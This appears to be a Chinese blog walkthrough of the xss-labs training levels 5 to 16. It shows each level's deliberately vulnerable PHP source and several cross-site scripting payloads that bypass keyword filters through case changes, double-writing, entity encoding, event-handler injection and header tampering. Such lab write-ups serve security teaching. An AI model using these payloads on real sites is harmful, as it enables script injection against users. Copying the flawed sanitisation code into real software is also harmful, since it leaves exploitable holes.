<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level6.php?keyword&#x3D;break it out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level5&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level5.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122148322.png" alt="image-20200417122148322"></p>
<p>进行闭合尝试，发现对script进行了过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122411832.png" alt="image-20200417122411832"></p>
<p>尝试构造事件，发现onclick进行了过滤，在中间加了下划线</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122546166.png" alt="image-20200417122546166"></p>
<p>利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，没有对javascript进行过滤，触发xss</p>
<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code></p>
<p>复制payload提交，点击超链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123342981.png" alt="image-20200417123342981"></p>
<p>如果感觉这个尖括号不好找的话可以更改</p>
<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123459136.png" alt="image-20200417123459136"></p>
<p>点击超链接，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123511122.png" alt="image-20200417123511122"></p>
<h4 id="xss-labs第六关"><a href="#xss-labs第六关" class="headerlink" title="xss-labs第六关"></a>xss-labs第六关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>过滤了<script、on、src、data、href标签</li>
<li>但是替换之前没有转化为小写字母，所以可以用大小写绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level7.php?keyword&#x3D;move up!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level6&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level6.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>闭合进行查看，script进行了过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130324942.png" alt="image-20200417130324942"></p>
<p>使用事件进行构造，事件也被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130416339.png" alt="image-20200417130416339"></p>
<p>发现和第五关一样，继续使用a标签进行闭合</p>
<p>href被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130529935.png" alt="image-20200417130529935"></p>
<p>因为href被过滤了，进行大小写尝试，提交之后发现遍蓝了，点击超链接</p>
<p>payload：<code>&quot;&gt;&lt;a Href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130621363.png" alt="image-20200417130621363"></p>
<p>页面成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130702200.png" alt="image-20200417130702200"></p>
<h4 id="xss-labs第七关"><a href="#xss-labs第七关" class="headerlink" title="xss-labs第七关"></a>xss-labs第七关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>过滤了script、on、src、data、href，并且在过滤前将keyword转换为了小写</li>
<li>第二处引用keyword没有编码，可以闭合input标签后，重写关键字绕过过滤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level8.php?keyword&#x3D;nice try!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level7&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level7.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了href和script。尝试大小写不能进行绕过。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417142620946.png" alt="image-20200417142620946"></p>
<p>因为href和script被过滤尝试一下双写看看能否绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143343630.png" alt="image-20200417143343630"></p>
<p>点击超链接，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143500825.png" alt="image-20200417143500825"></p>
<h4 id="xss-labs第八关"><a href="#xss-labs第八关" class="headerlink" title="xss-labs第八关"></a>xss-labs第八关</h4><p>源码</p>
<p>分析</p>
<ul>
<li><p>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</p>
</li>
<li><p>第一次引用keyword时，采用了htmlspecialchars</p>
</li>
<li><p>第二次引用keyword时，是在a标签中，而且没有用htmlspecialchars编码</p>
</li>
<li><p>考虑编码绕过：hackbar的XSS HTML Characters编码，可将所有字符（不同于htmlspecialchars仅将特殊字符编码）编码为HTML实体，从而绕过过滤。</p>
</li>
<li><p>然后构造弹框语句，注意到编码绕过后，在第二次引用keyword时，虽然没有htmlspecialchars编码，但是我们事先已经自己将提交的keyword编码为html实体了，所以此时输入的标签不会被执行，而是被当作普通字符串，所以只能构造href超链接，而不能闭合a标签。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level9.php?keyword&#x3D;not bad!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level8&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level8.jpg&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>javascript关键字被替换。尝试大小写，重复写，无法进行绕过。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417144646785.png" alt="image-20200417144646785"></p>
<p>尝试进行Unicode编码</p>
<p>payload：<code>&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151325070.png" alt="image-20200417151325070"></p>
<h4 id="xss-labs第九关"><a href="#xss-labs第九关" class="headerlink" title="xss-labs第九关"></a>xss-labs第九关</h4><p>查看源码</p>
<p>分析：</p>
<ul>
<li>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</li>
<li>规定在输入中必须包含http://</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level10.php?keyword&#x3D;well done!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level9&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level9.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，在响应查找构造的字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151831245.png" alt="image-20200417151831245"></p>
<p>这次并没有在href中所以在尝试一下script标签</p>
<p>可以看到，双引号颜色不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417152024621.png" alt="image-20200417152024621"></p>
<p>发现这里对url进行了限制，必须包含<code>http://</code></p>
<p>尝试构造<code>javascript:alert(1)http://</code>，居然不对</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194057445.png" alt="image-20200417194057445"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194113198.png" alt="image-20200417194113198"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194649514.png" alt="image-20200417194649514"></p>
<p>确实不对，那该怎么办呢，两</p>
<p>个解决办法：注释或者把http://放到aler()里面</p>
<p>payload：</p>
<p><code>javascr&amp;#x69;pt:alert(1)//http://</code></p>
<p><code>javascr&amp;#x69;pt:alert(&amp;#x22;http://&amp;#x22;)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194534225.png" alt="image-20200417194534225"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194731442.png" alt="image-20200417194731442"></p>
<h4 id="xss-labs第十关"><a href="#xss-labs第十关" class="headerlink" title="xss-labs第十关"></a>xss-labs第十关</h4><p>源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level11.php?keyword&#x3D;good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level10&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level10.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>页面中没有任何可以点击输入框，但是url可以输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195222663.png" alt="image-20200417195222663"></p>
<p>使用之前闭合查看发现尖括号被过滤，但是这里有三个隐藏的参数，不明白，看看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195429986.png" alt="image-20200417195429986"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195543547.png" alt="image-20200417195543547"></p>
<p>keyword被htmlspecialchars过滤，但是还有一个参数t_sort没有防护，只是过滤了尖括号，然后放到了一个input标签中隐藏起来，如果找不到可以t_link、t_history、t_sort这三个每个都尝试一下，会发现t_sort可以使用</p>
<p>可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload：<code>?t_sort=&quot; onclick=alert(1) type=&quot;text&quot;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195733849.png" alt="image-20200417195733849"></p>
<p>成功显示了输入框，使用的onclick，需要单击一下输入框，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195815568.png" alt="image-20200417195815568"></p>
<h4 id="xss-labs第十一关"><a href="#xss-labs第十一关" class="headerlink" title="xss-labs第十一关"></a>xss-labs第十一关</h4><p>查看响应</p>
<p>发现有一个t_ref字段是http referer的值，可能存在xss注入点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085345849.png" alt="image-20200418085345849"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085849316.png" alt="image-20200418085849316"></p>
<p>因为是referer所以需要使用burp抓包，然后修改referer的参数</p>
<p>修改前的参数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418090943906.png" alt="image-20200418090943906"></p>
<p>修改后的参数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091152599.png" alt="image-20200418091152599"></p>
<p>修改完放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091254595.png" alt="image-20200418091254595"></p>
<p>点击输入框，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091314306.png" alt="image-20200418091314306"></p>
<h4 id="xss-labs第十二关"><a href="#xss-labs第十二关" class="headerlink" title="xss-labs第十二关"></a>xss-labs第十二关</h4><p>下查看响应</p>
<p>可以看到t_ua是http  User-Agent的值。所以还是需要抓包修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092006907.png" alt="image-20200418092006907"></p>
<p>进行抓包，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092823329.png" alt="image-20200418092823329"></p>
<p>成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092306031.png" alt="image-20200418092306031"></p>
<h4 id="xss-labs第十三关"><a href="#xss-labs第十三关" class="headerlink" title="xss-labs第十三关"></a>xss-labs第十三关</h4><p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418093556616.png" alt="image-20200418093556616"></p>
<p>跟前两关一样，直接使用burp抓包，修改cookie的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095753042.png" alt="image-20200418095753042"></p>
<p>进行放行，单击箭头处的英文</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095842868.png" alt="image-20200418095842868"></p>
<p>页面成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418100012077.png" alt="image-20200418100012077"></p>
<h4 id="xss-labs第十四关"><a href="#xss-labs第十四关" class="headerlink" title="xss-labs第十四关"></a>xss-labs第十四关</h4><p>登不上，可以直接看先知上的wp了解exif xss</p>
<p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
<h4 id="xss-labs第十五关"><a href="#xss-labs第十五关" class="headerlink" title="xss-labs第十五关"></a>xss-labs第十五关</h4><p>查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102611400.png" alt="image-20200418102611400"></p>
<ul>
<li>这题有angular js，然后ng-include相当于php的include函数，然后src参数被转义了，最终我们可以include leve1然后再用img标签传xss(这里我用firefox打不成功，但是换chrome就可以了)</li>
</ul>
<p>payload：<code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<p>页面成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102458614.png" alt="image-20200418102458614"></p>
<h4 id="xss-labs第十六关"><a href="#xss-labs第十六关" class="headerlink" title="xss-labs第十六关"></a>xss-labs第十六关</h4><p>查看源码</p>
<p>发现对script、/、空格进行了转换，需要进行绕过</p>
